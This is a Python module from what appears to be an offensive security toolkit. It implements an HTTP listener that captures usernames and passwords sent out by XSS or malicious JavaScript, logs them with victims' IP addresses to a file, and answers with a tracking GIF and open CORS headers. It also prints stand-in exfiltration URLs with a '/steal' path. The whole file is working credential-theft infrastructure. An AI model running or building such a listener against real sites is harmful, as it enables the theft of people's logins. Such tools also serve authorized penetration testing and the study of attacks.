"""
Credential Catcher Module
HTTP server to capture exfiltrated credentials from XSS/malicious JS
"""

import os
import sys
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from core.module_base import ModuleBase, ModuleType, Platform


class CredHandler(BaseHTTPRequestHandler):
    """HTTP handler for capturing credentials"""
    captured = []
    output_file = None

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        username = params.get('u', params.get('username', params.get('user', [''])))[0]
        password = params.get('p', params.get('password', params.get('pass', [''])))[0]

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        if username or password:
            cred = {
                'timestamp': timestamp,
                'path': self.path,
                'username': username,
                'password': password,
                'source_ip': self.client_address[0]
            }
            CredHandler.captured.append(cred)

            print(f"\n{'='*60}")
            print(f"\033[32m[+] CREDENTIALS CAPTURED!\033[0m {timestamp}")
            print(f"{'='*60}")
            print(f"  Source:   {self.client_address[0]}")
            print(f"  Path:     {self.path}")
            print(f"  Username: \033[33m{username}\033[0m")
            print(f"  Password: \033[33m{password}\033[0m")
            print(f"{'='*60}\n")
            sys.stdout.flush()

            if CredHandler.output_file:
                with open(CredHandler.output_file, 'a') as f:
                    f.write(f"{timestamp}|{username}|{password}|{self.client_address[0]}\n")

        # Send 1x1 transparent GIF
        self.send_response(200)
        self.send_header('Content-type', 'image/gif')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8', errors='ignore')

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        print(f"\n{'='*60}")
        print(f"\033[32m[+] POST DATA RECEIVED!\033[0m {timestamp}")
        print(f"{'='*60}")
        print(f"  Source: {self.client_address[0]}")
        print(f"  Path:   {self.path}")
        print(f"  Body:   {body[:500]}")
        print(f"{'='*60}\n")
        sys.stdout.flush()

        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.end_headers()


class CredCatcher(ModuleBase):
    """
    HTTP Credential Catcher
    Captures credentials exfiltrated via XSS or malicious JavaScript
    """

    def __init__(self):
        super().__init__()
        self.name = "cred_catcher"
        self.description = "HTTP server to capture exfiltrated credentials"
        self.author = "UwU Toolkit"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.MULTI
        self.tags = ["aws", "web", "xss", "credential", "exfiltration", "listener"]
        self.references = [
            "https://owasp.org/www-community/attacks/xss/",
        ]

        # Register options
        self.register_option("LHOST", "Listen address", default="0.0.0.0")
        self.register_option("LPORT", "Listen port", default=8888)
        self.register_option("OUTPUT", "Output file for captured credentials", default="/tmp/captured_creds.txt")

        self._server = None
        self._thread = None

    def run(self) -> bool:
        lhost = self.get_option("LHOST")
        lport = int(self.get_option("LPORT"))
        output = self.get_option("OUTPUT")

        CredHandler.output_file = output
        CredHandler.captured = []

        self.print_status(f"Starting credential catcher on {lhost}:{lport}")
        self.print_status(f"Output file: {output}")
        self.print_line()
        self.print_status("Waiting for credentials...")
        self.print_status("JS payload should send to:")
        self.print_line(f"  http://<YOUR_IP>:{lport}/steal?u=USER&p=PASS")
        self.print_line(f"  http://<YOUR_IP>:{lport}/creds.gif?username=USER&password=PASS")
        self.print_line()

        try:
            self._server = HTTPServer((lhost, lport), CredHandler)
            self.print_good(f"Listener started on {lhost}:{lport}")
            self.print_status("Press Ctrl+C to stop...")
            self._server.serve_forever()
        except KeyboardInterrupt:
            self.print_status("Stopping listener...")
            self._server.shutdown()
        except OSError as e:
            self.print_error(f"Could not bind to port: {e}")
            return False
        finally:
            if CredHandler.captured:
                self.print_line()
                self.print_good(f"Total credentials captured: {len(CredHandler.captured)}")
                for cred in CredHandler.captured:
                    self.print_line(f"  {cred['username']}:{cred['password']}")

        return True

    def check(self) -> bool:
        return True
